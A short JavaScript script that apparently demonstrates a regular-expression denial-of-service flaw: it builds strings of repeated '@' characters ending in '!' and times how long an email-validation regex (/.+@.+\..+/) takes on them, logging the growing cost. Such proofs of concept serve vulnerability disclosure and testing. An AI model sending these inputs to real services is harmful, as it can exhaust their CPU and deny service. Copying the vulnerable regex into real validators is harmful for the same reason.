function isEmail (username) {
    const re = /.+@.+\..+/;
    let ok = re.exec(username);

    return ok;
}

function build_blank(n) {
 var ret = ""
 for (var i = 0; i < n; i++) {
  ret += "@"
 }
 return ret + "!";
}

for(var i = 1; i <= 5000000; i++) {
    if (i % 1000 == 0) {
        var time = Date.now();
        var attack_str = build_blank(i)
        isEmail(attack_str)
        var time_cost = Date.now() - time;
        console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
 }
}